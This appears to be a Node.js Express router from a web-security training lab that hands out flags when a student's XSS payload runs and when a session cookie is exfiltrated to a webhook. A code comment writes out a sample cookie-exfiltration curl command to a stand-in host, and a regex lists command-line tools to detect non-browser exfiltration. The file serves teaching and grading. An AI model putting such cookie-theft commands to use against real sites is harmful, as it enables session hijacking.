const express = require('express');
const { awardFlag } = require('../award');
const { isSecret } = require('../auth-cookie');

const router = express.Router();

// Endpoint caché appelé par une payload XSS exécutée dans le navigateur de la
// victime : c'est cet appel, et non l'injection elle-même, qui prouve
// l'exécution. Monté sur /api/xss-flag dans index.js.
router.get('/', (req, res) => {
  const response = {};
  const reflected = req.query.type === 'reflected';

  awardFlag(req, response, reflected ? 'REFLECTED_XSS' : 'STORED_XSS', {
    proof: 'xss_payload_executed',
    type: reflected ? 'reflected' : 'stored',
    message: 'Payload XSS exécutée dans le navigateur : le script a bien tourné !',
  });

  res.json(response);
});

// POST /api/xss-flag/cookie
// Appelé par le Hacking QG quand une valeur suspecte arrive sur son webhook.
// Le flag ne tombe que si le jeton est le bon ET que l'exfiltration provient
// d'une page du shop exécutée dans un navigateur : sans ça, un simple
// `curl '<qg>/log?c=<mon_cookie>'` suffisait à valider le challenge.
const CLI_AGENTS = /curl|wget|python|httpie|powershell|postman|insomnia|go-http|java|libwww/i;

router.post('/cookie', (req, res) => {
  const { value, origin, referer, userAgent } = req.body || {};

  if (!isSecret(value)) {
    return res.json({ valid: false, reason: 'unknown_value' });
  }

  const fromBrowser = !!userAgent && !CLI_AGENTS.test(userAgent);
  const fromPage = !!origin || !!referer;
  if (!fromBrowser || !fromPage) {
    return res.json({ valid: false, reason: 'not_from_browser' });
  }

  const response = {};
  awardFlag(req, response, 'COOKIE_THEFT', {
    proof: 'session_cookie_exfiltrated',
    origin: origin || referer,
    message: 'Cookie de session exfiltré vers ton serveur : la chaîne XSS est complète !',
  });

  res.json({ valid: !!response.flag, ...response });
});

module.exports = router;
